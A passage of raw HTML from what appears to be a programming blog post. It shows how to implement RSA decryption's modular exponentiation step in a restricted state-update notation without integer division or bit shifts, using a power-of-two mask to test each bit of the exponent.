style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;:[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;],_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;:[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;_[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;]][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]],&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q&amp;#34;&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:[],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;]],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;]],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x0&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x1&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;]],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;which just preserves the value by assigning it to itself, such as &lt;code&gt;{&amp;quot;a&amp;quot;:_[&amp;quot;a&amp;quot;], ...}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It just made the code considerably longer, but it&amp;rsquo;s nothing new.&lt;/p&gt;
&lt;p&gt;With that tedious section out the way, we move onto yet another instance where we need to use integer division&amp;hellip; or not?&lt;/p&gt;
&lt;h3 id=&#34;integer-division-in-modular-exponentiation-or-not&#34;&gt;Integer division in modular exponentiation&amp;hellip; or not?&lt;/h3&gt;
&lt;p&gt;Now that we have &lt;code&gt;d&lt;/code&gt; from the previous step, our last step is to implement modular exponentiation once again, to calculate &lt;code&gt;m = pow(c, d, n)&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exp&lt;/span&gt;(c, d, n):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (r &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; c) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; c) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There is integer division as &lt;code&gt;d = d // 2&lt;/code&gt;, but notice that only the LSB of &lt;code&gt;d&lt;/code&gt; is being checked. The function just loops through all bits of &lt;code&gt;d&lt;/code&gt;, modifying &lt;code&gt;r&lt;/code&gt; depending on if it&amp;rsquo;s equal to 1 or not, and dividing by 2 is just another of bitshifting right by 1.&lt;/p&gt;
&lt;p&gt;We can&amp;rsquo;t use bitshifts, but we can use powers of 2. This means we can actually rewrite the code to this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exp&lt;/span&gt;(c, d, n):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (r &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; c) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; c) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        e &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;where we use &lt;code&gt;e&lt;/code&gt; as a power of 2, and use &lt;code&gt;&amp;amp;&lt;/code&gt; to see if the bit at that index is set.&lt;/p&gt;
&lt;p&gt;This is great, as it means we don&amp;rsquo;t need integer division, and it&amp;rsquo;s pretty simple to implement!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;:c}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;:[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;],_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;:[_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;],_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N][_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],&lt;span 